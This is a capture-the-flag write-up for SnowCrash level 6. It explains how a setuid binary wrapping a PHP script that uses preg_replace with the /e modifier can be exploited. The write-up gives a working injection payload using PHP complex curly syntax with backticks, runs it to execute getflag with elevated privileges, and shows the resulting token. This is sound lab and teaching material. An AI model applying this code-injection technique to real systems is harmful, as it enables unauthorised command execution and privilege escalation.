# Level06


# context

after loged in with user `level06` to files pops up in home dir
```
level06@SnowCrash:~$ ls -la
total 24
dr-xr-x---+ 1 level06 level06  140 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level06 level06  220 Apr  3  2012 .bash_logout
-r-x------  1 level06 level06 3518 Aug 30  2015 .bashrc
-r-x------  1 level06 level06  675 Apr  3  2012 .profile
-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
level06@SnowCrash:~$
```

# steps to repreduce

when execute the file `level06` an error pops up
```
level06@SnowCrash:~$ ./level06
PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4
level06@SnowCrash:~$
```

I noted that this executeable take a file as an argement pass it to the `level06.php` to read it's content

let's test this:
```
level06@SnowCrash:~$ echo "this is a test" > /tmp/test.txt
level06@SnowCrash:~$ ./level06 /tmp/test.txt
this is a test
level06@SnowCrash:~$
```

now let's see the content of the second file `level06.php`.

```
level06@SnowCrash:~$ cat level06.php
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
level06@SnowCrash:~$
```

The given code appears to be a PHP script. Here's a breakdown of what it does:

The first line, `#!/usr/bin/php`, is called a shebang and specifies the interpreter to be used for executing the script, in this case, PHP.

The script starts with the opening <?php tag, indicating the beginning of PHP code.

The code defines two functions:

a. The `y()` function takes a parameter `$m`, performs two replacements on it, and returns the modified string. The first replacement replaces each occurrence of a dot (.`) with the string "`x`", and the second replacement replaces each occurrence of an at symbol (`@`) with the letter "`y`".

b. The `x()` function takes two parameters, `$y` and `$z`, and performs several operations on a file specified by `$y`. It reads the contents of the file using `file_get_contents()`, performs a regular expression replacement using `preg_replace()` on any occurrence of `[x ...]`, and invokes the `y()` function with the captured value (`\\2`). It then performs two more replacements, replacing each `[` character with `(` and each `]` character with `)`. Finally, it returns the modified string.

The next line of code `$r = x($argv[1], $argv[2]);` calls the `x()` function, passing two command-line arguments (`$argv[1]` and `$argv[2]`) to it. The script likely expects two command-line arguments to be provided when executing the script.

The last line print `$r`; outputs the value stored in the variable `$r`.

> In summary, this script reads the contents of a file specified as the first command-line argument, 
> performs some string replacements on it using the y() and x() functions, and then prints the modified string.

> the `/e` modifier in the `preg_replace()` function within the `x()` function can be potentially unsafe 
> if the replacement expression is derived from user input. The `/e` modifier allows the replacement expression to be evaluated as PHP code,
> which can lead to code injection vulnerabilities if the input is not properly validated or sanitized.

so we can pass shell command inside a file then send it to the `level06` executeable, the the scrip will run the command in the file with the `flag06` privilege.

but ofc not that easy so we had to use the [Complex (curly) syntax](https://www.php.net/manual/en/language.types.string.php#language.types.string.parsing.complex) to atchive what we want.

the final payload: ``echo '[x ${`getflag`}]' > /tmp/getflag``

then run this command: 
```
level06@SnowCrash:~$ ./level06 /tmp/getflag
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1

level06@SnowCrash:~$
```

